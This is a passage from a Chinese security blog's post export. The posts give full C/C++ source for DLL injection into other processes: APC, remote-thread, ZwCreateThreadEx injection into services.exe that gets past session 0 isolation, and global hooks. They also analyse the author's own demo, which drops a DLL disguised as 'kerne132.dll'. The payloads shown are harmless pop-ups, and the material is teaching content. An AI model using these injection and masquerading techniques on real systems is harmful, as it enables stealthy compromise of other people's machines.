CloseHandle(hProcess); hProcess = NULL; &#125; if (pThreadId) &#123; delete[]pThreadId; pThreadId = NULL; &#125; return flag;&#125;int main()&#123; BOOL flag=Inject(&quot;TestApc.exe&quot;, &quot;C:\\\\Users\\\\Tophanter\\\\Desktop\\\\RemoteTest.dll&quot;); if (flag == TRUE) &#123; printf(&quot;注入成功\\n&quot;); &#125; else printf(&quot;失败\\n&quot;); getchar(); return 0;&#125; 效果查看写一个MFC的小程序，点击确定按钮之后就会调用SleepEx函数。 123456void CTestApcDlg::OnBnClickedOk()&#123; // TODO: 在此添加控件通知处理程序代码 SleepEx(10000, true); //CDialogEx::OnOK();&#125; 然后打开我们的注入程序，看到提示已经注入成功。 点击确定按钮，就会弹出我们在DLL里写好的弹窗。 使用process explore工具查看可以看到我们的DLL已经注入到TestApc.exe中了。","categories":[{"name":"黑客编程","slug":"黑客编程","permalink":"https://b1ack1e.github.io/categories/%E9%BB%91%E5%AE%A2%E7%BC%96%E7%A8%8B/"}],"tags":[{"name":"恶意代码","slug":"恶意代码","permalink":"https://b1ack1e.github.io/tags/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81/"},{"name":"黑客编程","slug":"黑客编程","permalink":"https://b1ack1e.github.io/tags/%E9%BB%91%E5%AE%A2%E7%BC%96%E7%A8%8B/"},{"name":"注入","slug":"注入","permalink":"https://b1ack1e.github.io/tags/%E6%B3%A8%E5%85%A5/"}]},{"title":"突破session 0隔离的远线程注入","slug":"突破SESSION 0隔离的远线程注入","date":"2021-07-13T02:02:17.000Z","updated":"2021-07-13T07:24:27.810Z","comments":true,"path":"2021/07/13/突破SESSION 0隔离的远线程注入/","link":"","permalink":"https://b1ack1e.github.io/2021/07/13/%E7%AA%81%E7%A0%B4SESSION%200%E9%9A%94%E7%A6%BB%E7%9A%84%E8%BF%9C%E7%BA%BF%E7%A8%8B%E6%B3%A8%E5%85%A5/","excerpt":"","text":"SESSION 0隔离在早期操作系统中，所有的服务和应用程序都是运行在同一个session中，session 0。这些一起运行的服务与应用程序，由于服务是以最高权限进行运行的，所以造成一些安全风险，恶意代码可以利用这点来提升自己的权限。 在Visita中，服务在一个叫做session0的特殊session中承载。应用程序在其他session中，这样服务与应用程序就隔离开来。这样的话，恶意代码要向注入到关键的系统服务进程中，就会因为session 0的隔离而失败。 但是直接调用zwCreateThreadEx函数可以进行远线程注入，还可以突破隔离。 实现原理实现突破SESSION 0隔离的注入技术是使用比CreateRemoteThread函数更为底层的ZwCreateThreadEx函数来创建的远线程的。因为此函数在ntdll.dll中没有声明，所以需要使用GetProcAddress从ntdll.dll中获取该函数的导出地址。 ZwCreateThreadEx函数比CreateRemoteThread函数更为底层，那么CreateRemoteThread函数最终还是通过调用ZwCreateThreadEx函数来实现远线程创建的。为什么使用CreateRemoteThread函数没有用。经过前人的跟踪与分析，发现调用ZwCreateThreadEx函数创建远线程的时候，第七个参数的值为1，这会导致创建的线程完成后一直挂起无法恢复运行，这就是为什么DLL注入失败的原因。要想成功的话，就要直接调用ZwCreateThreadEx函数，将第七个参数设置为0，这样线程创建完成之后就会恢复运行，成功注入。 代码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133#include &quot;pch.h&quot;#include &lt;Windows.h&gt;#include &lt;processthreadsapi.h&gt;#include &lt;stdio.h&gt;#include &lt;tlhelp32.h&gt;#include &lt;atlconv.h&gt;#include &lt;atlstr.h&gt;BOOL CreateRemoteThreadInject(DWORD dwProcessId, WCHAR* pszDllFileName) &#123; //提升权限 HANDLE hToken; if (OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &amp;hToken) == false) &#123; printf(&quot;打开近访问令牌失败\\n&quot;); return FALSE; &#125; LUID luid; if (LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &amp;luid) == false) &#123; printf(&quot;查看特权信息失败\\n&quot;); return FALSE; &#125; TOKEN_PRIVILEGES tkp; tkp.PrivilegeCount = 1; tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED; tkp.Privileges[0].Luid = luid; if (false == AdjustTokenPrivileges(hToken, FALSE, &amp;tkp, sizeof(tkp), NULL, NULL)) &#123; printf(&quot;调节权限失败\\n&quot;); return FALSE; &#125; HANDLE hProcess = NULL; DWORD dwSize = 0; LPVOID pDllAddr = NULL; FARPROC pFuncProcAddr = NULL; //获取注入进程句柄 hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwProcessId); if (hProcess == NULL) &#123; printf(&quot;打开进程失败\\n&quot;); return FALSE; &#125; dwSize = lstrlen(pszDllFileName) + 1; //printf(&quot;dwSize:%d\\n&quot;, dwSize); //申请内存 pDllAddr = VirtualAllocEx(hProcess, NULL, 0x100, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE); if (pDllAddr == NULL) &#123; printf(&quot;申请内存失败\\n&quot;); return FALSE; &#125; //向申请的内存写入数据 BOOL WriteFlag = WriteProcessMemory(hProcess, pDllAddr, pszDllFileName, dwSize * 2, NULL); if (WriteFlag == NULL) &#123; printf(&quot;写入内存失败\\n&quot;); return FALSE; &#125; HMODULE hNtdll = LoadLibrary(L&quot;ntdll.dll&quot;); if (hNtdll == NULL) &#123; printf(&quot;获取NTDLL地址失败\\n&quot;); return FALSE; &#125; //获取loadlibrary pFuncProcAddr = GetProcAddress(GetModuleHandle(L&quot;kernel32.dll&quot;), &quot;LoadLibraryW&quot;); if (pFuncProcAddr == NULL) &#123; printf(&quot;获取loadlibrary地址失败\\n&quot;); return FALSE; &#125;#ifdef _WIN64 typedef DWORD(WINAPI* typedef_ZwCreateThreadEx)( PHANDLE ThreadHandle, ACCESS_MASK DesiredAccess, LPVOID ObjectAttributes, HANDLE ProcessHandle, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, ULONG CreateThreadFlags, SIZE_T ZeroBits, SIZE_T StackSize, SIZE_T MaximumStackSize, LPVOID pUnkown);#else typedef DWORD(WINAPI* typedef_ZwCreateThreadEx)( PHANDLE ThreadHandle, ACCESS_MASK DesiredAccess, LPVOID ObjectAttributes, HANDLE ProcessHandle, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, BOOL CreateSuspended, DWORD dwStackSize, DWORD dw1, DWORD dw2, LPVOID pUnkown);#endif typedef_ZwCreateThreadEx ZwCreateThreadEx = (typedef_ZwCreateThreadEx)GetProcAddress(hNtdll, &quot;ZwCreateThreadEx&quot;); if (ZwCreateThreadEx == NULL) &#123; printf(&quot;获取ZW地址失败\\n&quot;); return FALSE; &#125; HANDLE hRemoteThread = NULL; ZwCreateThreadEx(&amp;hRemoteThread, PROCESS_ALL_ACCESS, NULL, hProcess, (LPTHREAD_START_ROUTINE)pFuncProcAddr, pDllAddr, 0, 0, 0, 0, NULL); if (hRemoteThread == NULL) &#123; printf(&quot;创建失败\\n&quot;); return FALSE; &#125; CloseHandle(hProcess); FreeLibrary(hNtdll); return TRUE;&#125;DWORD GetPID(char* pszProcessName) &#123; HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0); PROCESSENTRY32 pe = &#123; sizeof(pe) &#125;;//初始化 USES_CONVERSION; CString ProcessName = A2T(pszProcessName); BOOL flag = Process32First(hSnap, &amp;pe); while (flag) &#123; if (lstrcmp(pe.szExeFile, ProcessName) == 0) &#123; return pe.th32ProcessID; &#125; flag = Process32Next(hSnap, &amp;pe); &#125; CloseHandle(hSnap); return 0;&#125;int main() &#123; printf(&quot;按下回车开始注入\\n&quot;); getchar(); DWORD dwPID = GetPID(&quot;services.exe&quot;); bool flag = CreateRemoteThreadInject(dwPID, L&quot;C:\\\\Users\\\\b1ackie\\\\Desktop\\\\RemoteTest.dll&quot;); if (flag == FALSE) &#123; printf(&quot;注入失败\\n&quot;); &#125; else printf(&quot;注入成功\\n&quot;); getchar(); return 0;&#125; 效果查看尝试注入SESSION 0的service.exe，使用Process Explorer可以看到services.exe的相关信息 打开程序，按下回车开始注入，显示注入成功 使用Process Explorer查看services.exe的导入模块","categories":[{"name":"黑客编程","slug":"黑客编程","permalink":"https://b1ack1e.github.io/categories/%E9%BB%91%E5%AE%A2%E7%BC%96%E7%A8%8B/"}],"tags":[{"name":"恶意代码","slug":"恶意代码","permalink":"https://b1ack1e.github.io/tags/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81/"},{"name":"黑客编程","slug":"黑客编程","permalink":"https://b1ack1e.github.io/tags/%E9%BB%91%E5%AE%A2%E7%BC%96%E7%A8%8B/"},{"name":"注入","slug":"注入","permalink":"https://b1ack1e.github.io/tags/%E6%B3%A8%E5%85%A5/"}]},{"title":"远程线程注入","slug":"远程线程注入","date":"2021-07-12T03:56:15.000Z","updated":"2021-07-12T11:10:48.423Z","comments":true,"path":"2021/07/12/远程线程注入/","link":"","permalink":"https://b1ack1e.github.io/2021/07/12/%E8%BF%9C%E7%A8%8B%E7%BA%BF%E7%A8%8B%E6%B3%A8%E5%85%A5/","excerpt":"","text":"远程线程注入远程线程注入是指一个进程在另一个进程中创建线程的技术。 函数介绍OpenProcess打开现有的本地进程对象 12345HANDLE OpenProcess( DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwProcessId); dwDesiredAccess：访问进程对象。此访问权限为针对进程的安全描述符进行检查，此参数可以是一个或者多个进程访问权限。如果调用了该函数的进程启用了SeDebugPrivilege权限，则无论安全描述符的内容是什么，它都会授予所请求的访问权限。 bInheritHandle：若此值为TRUE，则此进程创建的进程将继承该句柄。否则，进程不会进程此句柄。 dwProcessId：要打开的本地进程PID。 返回值：如果函数成功，则返回值是指定进程的打开句柄；如果失败，则返回值为NULL。 VirtualAllocEx在指定进程的虚拟地址空间内保留、提交或更改内存的状态。 1234567LPVOID VirtualAllocEx( HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect); hProcess：进程的句柄。此函数在该进程的虚拟地址空间内分配内存，句柄必须具有PROCESS_VM_OPERATION访问权限。 lpAddress：指定要分配页面所需起始地址的指针。如果为NULL，则该函数自动分配内存。 dwSize：要分配的内存大小，以字节为单位。 flAllocationType：内存分配类型。此参数必须为以下值之一。 值 含义 MEM_COMMIT0x00001000 在磁盘的分页文件和整体内存中，为指定的预留内存页分配内存 MEM_RESERVE0x00002000 保留进程中虚拟地址空间的范围，但不会在内存或磁盘上的分页文件中分配任何实际物理存储位置 MEM_RESET0x00080000 表示不再关注由lpAddress和dwSize指定的内存范围内的数据，页面不应从页面文件中读取或写入。 MEM_RESET_UNDO0x1000000 只能在早期成功应用了MEM_RESET的地址范围内调用MEM_RESET_UNDO flProtect：要分配的页面区域的内存保护。如果页面已提交，则可以指定任何一个内存保护常量。如果lpAddress指定了一个地址，则flProtect不能是以下任何值： PAGE_NOACCESS PAGE_GUARD PAGE_NOCACHE PAGE_WRITECOMBINE 返回值：如果函数成功，则返回值是分配页面的基址；如果失败，则返回为NULL。 WriteProcessMemory在指定的进程中将数据写入内存区域，要写入的整个区域必须可访问，否则操作失败。 1234567BOOL WriteProcessMemory( HANDLE hProcess, LPVOID lpBaseAddress, LPCVOID lpBuffer, SIZE_T nSize, SIZE_T *lpNumberOfBytesWritten); hProcess：要修改的进程内存的句柄。句柄必须具有PROCESS_VM_WRITE和PROCESS_VM_OPERATION访问权限。 lpBaseAddress：指向指定进程中写入数据的基地址指针。在数据传输发生之前，系统会验证指定大小的基地址和内存中的所有数据是否可以进行写入访问，如果不可以访问，则该函数将失败。 lpBuffer：指向缓冲区的指针，其中包含要写入指定进程的地址空间中的数据。 nSize：要写入指定进程的字节数。 lpNumberOfBytesWritten：指向变量的指针，该变量接受传输到指定进程的字节数。如果为NULL，则忽略该参数。 返回值：如果函数成功，则返回值不为0；如果失败，则为0； CreateRemoteThread创建一个在另一个进程的虚拟地址空间中运行的线程。 123456789HANDLE CreateRemoteThread( HANDLE hProcess, LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId); hProcess：要创建线程的进程的句柄。句柄必须具有PROCESS_CREATE_THREAD、PROCESS_QUERY_INFORMATION、PROCESS_VM_OPERATION、PROCESS_VM_WRITE和PROCESS_VM_READ访问权限。 lpThreadAttributes：指向SECURITY_ATTRIBUTES结构的指针，该结构指定新线程的安全描述符，并确定子进程是否可以继承返回的句柄。如果为NULL，则线程将会获得默认的安全描述符，并且不能继承该句柄。 dwStackSize：堆栈的初始大小，以字节为单位。如果参数为0，则新线程使用可执行文件的默认大小。 lpStartAddress：指向由线程执行类型为LPTHREAD_START_ROUTINE的应用程序定义的函数指针，并表示远程进程中线程的起始地址，该函数必须存在于远程进程中。 lpParameter：指向要传递给线程函数的变量的指针。 dwCreationFlags：控制线程创建的标志。 值 含义 0 线程在创建后立即运行 CREATE_SUSPENDED 该线程在挂起状态下创建，并且在调用ResumeThread函数之前不会运行 STACK_SIZE_PARAM_IS_A_RESERVATION 所述dwStackSize参数指定堆栈的初始保留大小。如果未指定此标志，则dwStackSize指定提交大小。 lpThreadId：指向接受线程标识符的变量的指针。如果此参数为NULL，则不返回线程标识符。 返回值：如果成功，则返回值是新线程的句柄；如果失败，则返回NULL。 实现过程RemoteThreadInject.cpp代码如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172#include &quot;pch.h&quot;#include &lt;Windows.h&gt;#include &lt;processthreadsapi.h&gt;#include &lt;stdio.h&gt;BOOL CreateRemoteThreadInject(DWORD dwProcessId, WCHAR* pszDllFileName) &#123; HANDLE hProcess = NULL; DWORD dwSize = 0; LPVOID pDllAddr = NULL; FARPROC pFuncProcAddr = NULL; //获取注入进程句柄 hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwProcessId); if (hProcess == NULL) &#123; printf(&quot;打开进程失败\\n&quot;); return FALSE; &#125; dwSize = lstrlen(pszDllFileName) + 1; //申请内存 pDllAddr = VirtualAllocEx(hProcess, NULL, 0x100, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE); if (pDllAddr == NULL) &#123; printf(&quot;申请内存失败\\n&quot;); return FALSE; &#125; //向申请的内存写入数据 BOOL WriteFlag = WriteProcessMemory(hProcess, pDllAddr, pszDllFileName, dwSize * 2, NULL); if (WriteFlag == NULL) &#123; printf(&quot;写入内存失败\\n&quot;); return FALSE; &#125; //获取loadlibrary pFuncProcAddr = GetProcAddress(GetModuleHandle(L&quot;kernel32.dll&quot;), &quot;LoadLibraryW&quot;); if (pFuncProcAddr == NULL) &#123; printf(&quot;获取loadlibrary地址失败\\n&quot;); return FALSE; &#125; HANDLE hRemoteThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pFuncProcAddr, pDllAddr, 0, NULL); if (hRemoteThread == NULL) &#123; printf(&quot;创建线程失败\\n&quot;); return FALSE; &#125; WaitForSingleObject(hRemoteThread, -1); DWORD code; GetExitCodeThread(hRemoteThread, &amp;code); code = GetLastError(); VirtualFreeEx(hProcess, pDllAddr, 0, MEM_RELEASE); CloseHandle(hProcess); CloseHandle(hRemoteThread); return TRUE;&#125;int main() &#123; printf(&quot;按下回车开始注入\\n&quot;); getchar(); HWND hNotepadWindow = FindWindow(L&quot;Notepad&quot;,L&quot;无标题 - 记事本&quot;); if (hNotepadWindow == NULL) &#123; printf(&quot;打开进程失败\\n&quot;); exit(-1); &#125; DWORD dwPID = 0; GetWindowThreadProcessId(hNotepadWindow, &amp;dwPID); if (dwPID == 0) &#123; printf(&quot;获取PID失败\\n&quot;); exit(-1); &#125; bool flag = CreateRemoteThreadInject(dwPID, L&quot;C:\\\\Users\\\\Tophanter\\\\Desktop\\\\RemoteTest.dll&quot;); if (flag == FALSE) &#123; printf(&quot;注入失败\\n&quot;); &#125; else printf(&quot;注入成功\\n&quot;); getchar(); return 0;&#125; dllmain.cpp代码如下，主要实现一个弹窗功能。 1234567891011121314151617181920// dllmain.cpp : 定义 DLL 应用程序的入口点。#include &quot;pch.h&quot;BOOL APIENTRY DllMain( HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved )&#123; switch (ul_reason_for_call) &#123; case DLL_PROCESS_ATTACH: MessageBox(NULL, L&quot;注入成功！&quot;, L&quot;ok&quot;, MB_OK); break; case DLL_THREAD_ATTACH: case DLL_THREAD_DETACH: case DLL_PROCESS_DETACH: break; &#125; return TRUE;&#125; 效果查看先打开notepad再打开我们编写的程序，将DLL文件放在指定路径下。 开始注入，就可以看到已经成功弹出了窗口。","categories":[{"name":"黑客编程","slug":"黑客编程","permalink":"https://b1ack1e.github.io/categories/%E9%BB%91%E5%AE%A2%E7%BC%96%E7%A8%8B/"}],"tags":[{"name":"恶意代码","slug":"恶意代码","permalink":"https://b1ack1e.github.io/tags/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81/"},{"name":"黑客编程","slug":"黑客编程","permalink":"https://b1ack1e.github.io/tags/%E9%BB%91%E5%AE%A2%E7%BC%96%E7%A8%8B/"},{"name":"注入","slug":"注入","permalink":"https://b1ack1e.github.io/tags/%E6%B3%A8%E5%85%A5/"}]},{"title":"病毒分析-资源释放+钩子注入","slug":"病毒分析-资源释放+钩子注入","date":"2021-07-12T02:15:02.000Z","updated":"2021-07-12T03:52:12.644Z","comments":true,"path":"2021/07/12/病毒分析-资源释放+钩子注入/","link":"","permalink":"https://b1ack1e.github.io/2021/07/12/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90-%E8%B5%84%E6%BA%90%E9%87%8A%E6%94%BE+%E9%92%A9%E5%AD%90%E6%B3%A8%E5%85%A5/","excerpt":"","text":"把上次写的资源释放和全局钩子注入结合起来，做了一个小demo，实现功能就是把自己的写的DLL作为资源加入，然后自释放出来，再调用这个DLL进行钩子注入。 使用dir工具先查看一下基本信息，可以看到当前程序未加壳。 再查看一下导入表的相关信息，看看都使用了哪些API。可以看到一些资源相关API，还有Loadlibrary和getprocaddress，这两个API，写过shellcode都知道使用这两个API可以获取所有dll和其中的函数。 再查看一下字符串的一些信息，可以看到有这样一个字符串“C:\\Windows\\SysWOW64\\kerne132.dll”，可以看到这个dll和系统dll”kernel32.dll”区别是最后一位，用1代替了l。可能是一个恶意的dll被释放到了C:\\Windows\\SysWOW64\\下。 使用IDA查看一下，F5查看伪代码，可以先看到资源释放的过程，其释放了一个名为“kerne132.dll”的文件到C:\\Windows\\SysWOW64\\下。 然后调用了这个DLL里面的函数setglobalhook，从名字可以看出来，这应该是一个钩子的函数。 到目标目录下去查看一下，可以看到这个伪装成kernel32.dll的恶意dll文件。 使用IDA查看一下这个DLL文件，看一下它的导出表，可以看到导出了两个函数SetGlobalHook和UnsetGlobalHook，从名字上猜测应该是安装钩子和卸载钩子。 查看SetGlobalHook，可以看到使用了SetWindowsHookExW函数，IDHOOK的值是3,3是WH_GETMESSAGE代表这是一个全局钩子。 使用PC hunter工具可以很方便的查看是否存在钩子。","categories":[{"name":"病毒分析","slug":"病毒分析","permalink":"https://b1ack1e.github.io/categories/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/"}],"tags":[{"name":"逆向工程","slug":"逆向工程","permalink":"https://b1ack1e.github.io/tags/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B/"},{"name":"病毒分析","slug":"病毒分析","permalink":"https://b1ack1e.github.io/tags/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/"}]},{"title":"病毒分析-资源释放","slug":"病毒分析-资源释放","date":"2021-07-09T01:54:29.000Z","updated":"2021-07-12T02:15:39.146Z","comments":true,"path":"2021/07/09/病毒分析-资源释放/","link":"","permalink":"https://b1ack1e.github.io/2021/07/09/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90-%E8%B5%84%E6%BA%90%E9%87%8A%E6%94%BE/","excerpt":"","text":"本篇来分析一下自己写的资源释放的小demo。 打开程序，发现没有任何改变，没有明显的行为。 使用die工具查一下文件的基本信息 查看一下导入表，可以看到FindResource等函数，这几个函数是用来操作资源的，猜测有可能是释放了一个资源节中的资源到电脑上。 还可以看到fwrite，fopen这样的函数，那么应该就是把资源释放到了一个路径中去。 可以使用resource hacker来查看程序中的资源，如图可以看到资源信息“this is a test” 再使用IDA进行查看，可以很清楚的看到所有的流程，并且看到程序将释放的文件存放在了C:\\Windows\\System32下。 因为程序是32位程序，系统是64位，所以资源会被释放到SysWOW64文件下。因为此文件夹是用来处理运行在64位系统上的32位程序的。 到路径下查找free.txt即可找到","categories":[{"name":"病毒分析","slug":"病毒分析","permalink":"https://b1ack1e.github.io/categories/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/"}],"tags":[{"name":"逆向工程","slug":"逆向工程","permalink":"https://b1ack1e.github.io/tags/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B/"},{"name":"病毒分析","slug":"病毒分析","permalink":"https://b1ack1e.github.io/tags/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/"}]},{"title":"全局钩子注入","slug":"全局钩子注入","date":"2021-07-08T09:52:07.000Z","updated":"2021-07-09T10:19:27.858Z","comments":true,"path":"2021/07/08/全局钩子注入/","link":"","permalink":"https://b1ack1e.github.io/2021/07/08/%E5%85%A8%E5%B1%80%E9%92%A9%E5%AD%90%E6%B3%A8%E5%85%A5/","excerpt":"","text":"全局钩子注入windows中大部分应用程序都是基于消息机制的，每个进程都有自己的消息队列。 局部钩子是针对某个线程的，全局钩子是作用于整个系统的基于消息的应用。全局钩子需要使用DLL文件，在DLL文件中实现相应的钩子函数。 函数介绍SetWindowsHookEx函数将程序定义的钩子函数安装到挂钩链中，安装钩子程序可以监视系统是否存在某些类型的事件，这些事件与特定线程或调用线程所在桌面中的所有线程相关联。 123456HHOOK SetWindowsHookExA( int idHook, HOOKPROC lpfn, HINSTANCE hmod, DWORD dwThreadId); 参数idHook：要安装的钩子程序的类型，该参数具体可以见下表。 值 含义 WH_CALLWNDPROC4 安装钩子程序，在系统将消息发送到目标窗口过程之前监视消息 WH_CALLWNDPROCRET12 安装钩子程序，在目标窗口过程处理消息后监视消息 WH_CBT5 安装接受对CBT应用程序有用通知的钩子程序 WH_DEBUG9 安装可用于调试其他钩子程序的钩子程序 WH_FOREGROUNDIDLE11 安装在应用程序的前台线程即将变为空闲时调用的钩子过程，该钩子对于在空闲时执行低优先级任务很有用 WH_GETMESSAGE3 安装一个挂钩过程，它监视发送到消息队列的消息 WH_JOURNALPLAYBACK1 安装一个挂钩过程，用于发布先前由WH_JOURNALRECORD挂钩过程记录的消息 WH_JOURNALRECORD0 安装一个挂钩过程，记录发布到系统消息队列中的输入消息。这个钩子对于录制宏很有用。 WH_KEYBOARD2 安装监视按键消息的挂钩过程 WH_KEYBOARD_LL13 安装监视低级键盘输入事件的挂钩过程 WH_MOUSE7 安装监视鼠标消息的挂钩过程 WH_MOUSE_LL14 安装监视低级鼠标输入事件的挂钩过程 WH_MSGFILTER-1 安装钩子程序，用于在对话框、消息框、菜单或滚动条中监视由于输入事件而生成的消息 WH_SHELL10 安装接受对于shell应用程序有用通知的钩子程序 WH_SYSMSGFILTER6 安装钩子程序，用于在对话框、消息框、菜单或滚动条中监视由于输入事件而生成的消息，钩子程序监视与调用线程相同桌面中所有应用程序的这些消息 lpfn：一个指向钩子程序的指针。如果dwThreadId参数为0或指定由不同进程创建线程标识符，则lpfn参数必须指向DLL中的钩子过程。否则，lpfn可以指向与当前进程关联的代码中的钩子过程。 hMod：包含由lpfn参数指向的钩子过程的DLL句柄。如果dwThreadId参数指定由当前进程创建线程，并且钩子过程位于与当前进程关联的代码中，则hMod参数必须设置为NULL。 dwThreadId：与钩子程序关联的线程标识符。如果此参数为0，则钩子过程与系统中所有线程相关联。 返回值如果函数成功，则返回值是钩子过程的句柄。 如果函数失败，则返回值为NULL。 实现过程创建全局钩子，钩子函数需要在一个DLL文件中。进程的地址空间是独立的，发生对应事件的进程不能调用其他进程地址空间的钩子函数。如果钩子的实现在DLL中的话，则在对应事件发生的时候，系统会把这个DLL加载到发生事件的进程地址空间之中，使它能够调用钩子函数进行处理。创建一个全局钩子之后，在对应事件发生的时候，系统就会把DLL加载到发生事件的进程中，这样就实现了DLL注入。 设置idHook的值为WH_GETMESSAGE就可以让DLL注入到所有的进程中，因为WH_GETMESSAGE类型的钩子会监视消息队列，并且Windows系统是基于消息驱动的，所有进程都会有一个自己的消息队列，都会加载WH_GETMESSAGE类型的全局钩子DLL。 DLL文件如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051// dllmain.cpp : 定义 DLL 应用程序的入口点。#include &quot;pch.h&quot;//共享内存#pragma data_seg(&quot;mydata&quot;)#pragma data_seg()#pragma comment(linker, &quot;/SECTION:mydata,RWS&quot;)HMODULE g_hDllModule = NULL;HHOOK g_hHook = NULL;// 钩子回调函数LRESULT GetMsgProc(int code, WPARAM wParam, LPARAM lParam)&#123; return CallNextHookEx(g_hHook, code, wParam, lParam);&#125;// 设置全局钩子BOOL SetGlobalHook()&#123; g_hHook = SetWindowsHookEx(WH_GETMESSAGE, (HOOKPROC)GetMsgProc, g_hDllModule, 0); if (NULL == g_hHook) &#123; return FALSE; &#125; return TRUE;&#125;// 卸载钩子BOOL UnsetGlobalHook()&#123; if (g_hHook) &#123; UnhookWindowsHookEx(g_hHook); &#125; return TRUE;&#125;BOOL APIENTRY DllMain( HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved )&#123; switch (ul_reason_for_call) &#123; case DLL_PROCESS_ATTACH: &#123; g_hDllModule = hModule; break; &#125; case DLL_THREAD_ATTACH: case DLL_THREAD_DETACH: case DLL_PROCESS_DETACH: break; &#125; return TRUE;&#125; 全局钩子是以DLL形式加载到其他进程空间之中的，且进程都是独立的，任意修改其中的一个内存里的数据是不会影响另一个进程的。所在DLL中创建了共享内存，共享内存是指突破进程独立性，多个进程共享同一段内存。在DLL中创建共享内存，就是在DLL之中创建一个变量，然后将DLL加载到多个进程空间，只要一个进程修改了该变量值，其他进程DLL中的这个值也会改变，就相当于多个进程共享一个内存。 编写一个调用DLL的程序，test.exe 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950// test.cpp : 此文件包含 &quot;main&quot; 函数。程序执行将在此处开始并结束。//#include &lt;iostream&gt;#include &lt;Windows.h&gt;int main()&#123; typedef BOOL(*typedef_SetGlobalHook)(); typedef BOOL(*typedef_UnsetGlobalHook)(); HMODULE hDll = NULL; typedef_SetGlobalHook SetGlobalHook = NULL; typedef_UnsetGlobalHook UnsetGlobalHook = NULL; BOOL bRet = FALSE; printf(&quot;按下回车开始设置钩子\\n&quot;); getchar(); do &#123; hDll = LoadLibrary(L&quot;Hook.dll&quot;); if (NULL == hDll) &#123; printf(&quot;加载DLL失败\\n错误代码%d\\n&quot;, GetLastError()); break; &#125; SetGlobalHook = (typedef_SetGlobalHook)GetProcAddress(hDll, &quot;SetGlobalHook&quot;); if (NULL == SetGlobalHook) &#123; printf(&quot;获取函数地址失败\\n错误代码%d\\n&quot;, GetLastError()); break; &#125; bRet = SetGlobalHook(); if (bRet) &#123; printf(&quot;设置钩子成功\\n&quot;); &#125; else &#123; printf(&quot;设置钩子失败\\n&quot;); &#125; system(&quot;pause&quot;); UnsetGlobalHook = (typedef_UnsetGlobalHook)GetProcAddress(hDll, &quot;UnsetGlobalHook&quot;); if (NULL == UnsetGlobalHook) &#123; printf(&quot;获取函数地址失败\\n错误代码%d\\n&quot;, GetLastError()); break; &#125; UnsetGlobalHook(); printf(&quot;卸载钩子成功\\n&quot;); &#125; while (FALSE); system(&quot;pause&quot;);&#125; 效果查看可以先试用PC hunter工具进行查看，可以看到当前没有任何消息钩子存在。 打开我们的test.exe，设置好钩子之后，再进行查看，刷新一下消息钩子列表，如图可以看到已经存在了一个消息钩子。 使用OD附加打开notepad.exe，再打开模块窗口。 再打开test.exe，进行钩子设置。可以很明显看到变化，已经注入成功了。","categories":[{"name":"黑客编程","slug":"黑客编程","permalink":"https://b1ack1e.github.io/categories/%E9%BB%91%E5%AE%A2%E7%BC%96%E7%A8%8B/"}],"tags":[{"name":"恶意代码","slug":"恶意代码","permalink":"https://b1ack1e.github.io/tags/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81/"},{"name":"黑客编程","slug":"黑客编程","permalink":"https://b1ack1e.github.io/tags/%E9%BB%91%E5%AE%A2%E7%BC%96%E7%A8%8B/"},{"name":"注入","slug":"注入","permalink":"https://b1ack1e.github.io/tags/%E6%B3%A8%E5%85%A5/"}]},{"title":"资源释放","slug":"资源释放","date":"2021-07-08T03:52:26.000Z","updated":"2021-07-09T03:35:22.401Z","comments":true,"path":"2021/07/08/资源释放/","link":"","permalink":"https://b1ack1e.github.io/2021/07/08/%E8%B5%84%E6%BA%90%E9%87%8A%E6%94%BE/","excerpt":"","text":"资源释放恶意代码会广泛的使用此技术，因为它可以使程序变得简洁，提高隐蔽性。如果一个程序需要额外的加载一些DLL、文本文件或者其他类型文件，将它们可以作为资源插入到程序中，在程序运行的时候再将它们释放到本地上，这样恶意代码会更加隐蔽。 函数介绍FindResource函数，确定具有指定类型和名称的资源在指定模块中的位置12345HRSRC FindResourceW( HMODULE hModule, LPCWSTR lpName, LPCWSTR lpType); hModule：处理包含资源的可执行文件模块。若hModule为NULL，则系统从当前进程的模块中装载资源。 lpName：指定资源名称 lpType：指定资源类型 返回值：如果函数运行成功，那么返回值为指定资源信息块的句柄。可将这个句柄传递给其它函数获取其他信息。如果失败，则返回NULL； SizeofResource函数：获取指定资源的字节数1234DWORD SizeofResource( HMODULE hModule, HRSRC hResInfo); 